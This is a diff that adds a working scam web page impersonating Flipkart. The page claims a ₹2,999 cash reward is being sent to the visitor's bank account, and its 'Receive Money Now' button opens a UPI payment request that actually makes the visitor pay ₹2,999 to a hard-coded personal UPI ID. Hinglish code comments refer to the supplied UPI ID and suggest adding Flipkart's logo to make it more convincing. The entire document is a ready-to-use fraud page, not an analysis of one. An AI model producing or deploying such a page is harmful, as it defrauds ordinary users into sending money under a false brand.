@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flipkart Reward Center</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #2874f0; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .reward-card { background: white; width: 100%; max-width: 400px; border-radius: 15px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); overflow: hidden; }
+        .header { background: #ffffff; padding: 20px; border-bottom: 2px solid #f0f0f0; }
+        .header img { width: 120px; } /* Yahan Flipkart ka logo link daal sakte hain */
+        .content { padding: 30px; }
+        .win-text { color: #28a745; font-size: 18px; font-weight: bold; margin-bottom: 10px; }
+        .amount { font-size: 45px; font-weight: 900; color: #333; margin: 15px 0; }
+        .amount span { font-size: 20px; vertical-align: top; margin-right: 5px; }
+        .receive-btn { background: #fb641b; color: white; width: 100%; padding: 18px; border: none; border-radius: 8px; font-size: 22px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 12px rgba(251,100,27,0.3); text-transform: uppercase; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
+        .footer-text { font-size: 12px; color: #777; margin-top: 20px; line-height: 1.4; }
+    </style>
+</head>
+<body>
+
+<div class="reward-card">
+    <div class="header">
+        <h2 style="color: #2874f0; margin: 0;">Flipkart Prize Hub</h2>
+    </div>
+    
+    <div class="content">
+        <div class="win-text">★ Congratulations! Payment Ready ★</div>
+        <p style="margin: 0; color: #666;">Transferring to your Bank Account:</p>
+        <div class="amount"><span>₹</span>2,999</div>
+        
+        <p style="font-size: 14px; color: #444; margin-bottom: 25px;">
+            Aapka cash reward approve ho gaya hai. Niche button par click karke turant apne bank account mein paise receive karein.
+        </p>
+
+        <button class="receive-btn" onclick="processReceive()">Receive Money Now</button>
+
+        <div class="footer-text">
+            Ref ID: FK-947228-PAY <br>
+            Secure 256-bit Encrypted Transaction
+        </div>
+    </div>
+</div>
+
+<script>
+    function processReceive() {
+        // Aapki di hui UPI ID aur fixed amount (e.g. 2999)
+        const upiId = "8709615634-w350@ybl";
+        const amount = "2999"; 
+        const name = "Flipkart_Reward";
+        
+        // Yeh link seedha GPay/PhonePe/Paytm app kholega
+        const upiIntent = `upi://pay?pa=${upiId}&pn=${encodeURIComponent(name)}&am=${amount}&cu=INR&tn=Cashback_Reward_Claim`;
+        
+        window.location.href = upiIntent;
+    }
+</script>
+
+</body>
+</html>
